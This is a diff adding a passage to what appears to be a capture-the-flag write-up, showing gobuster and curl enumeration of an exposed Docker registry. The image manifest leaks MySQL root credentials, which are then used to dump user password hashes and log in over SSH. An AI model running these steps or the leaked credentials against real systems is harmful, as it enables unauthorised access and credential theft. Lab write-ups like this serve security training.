@@ -50,6 +50,77 @@ PORT     STATE SERVICE REASON         VERSION
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Login
 ```
+--------------------------------------------------------------
+### EXPLOIT DOCKER and MYSQL: ###
+
++ Try through port 3306: MySQL and port 8080: Login_Page 
+--> We can not brute force the credential MySQL and Login_Page.
++ Let look at port 5000: Docker API v2.
++ Scan the diretories port 5000:
+
+```bash
+gobuster dir -u http://<IP>:5000/ -w /usr/share/wordlists/dirb/common.txt -t64
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/v2                   (Status: 301) [Size: 39] [--> /v2/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
++ Research the Docker port 5000 with /v2/ and we find out the technique to exploit the Docker.
++ "https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry#discovering".
+
+![alt text](image-3.png)
+
+![alt text](image-4.png)
+
++ We've taken the repo: "umbrella/timetracking".
++ Now we will be using curl to enumerate. 
+
+```bash
+curl -s http://10.10.188.207:5000/v2/umbrella/timetracking/manifests/latest
+{
+   "schemaVersion": 1,
+   "name": "umbrella/timetracking",
+   "tag": "latest",
+   "architecture": "amd64",
+   "fsLayers": [
+....
+"history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"node\",\"app.js\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":null},\"container\":\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-12-22T10:03:08.042002316Z\",\"docker_version\":\"20.10.17\",\"id\":\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\",\"os\":\"linux\",\"parent\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"throwaway\":true}"
+      }
+]
+ 
+ ....  ]
+} 
+```
+
+--> We have the credential MySQL: root:Ng1-f3!Pe7-e5?Nf3xe5
+and database name "timetracking".
+
++ Login again the MySQL:
++ "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands"
+
+![alt text](image-5.png)
+
++ Access database "timetracking" and we've gotten the all of users:
+
+![alt text](image-6.png)
+
++ We list each columns of table "users":
+
+![alt text](image-7.png)
+
++ After have the user and password, we decrypt each passwords and use it to login SSH.
++ We find out the credential which can login SSH successfully: claire-r:Password1
+
+
+
+
 
 
 
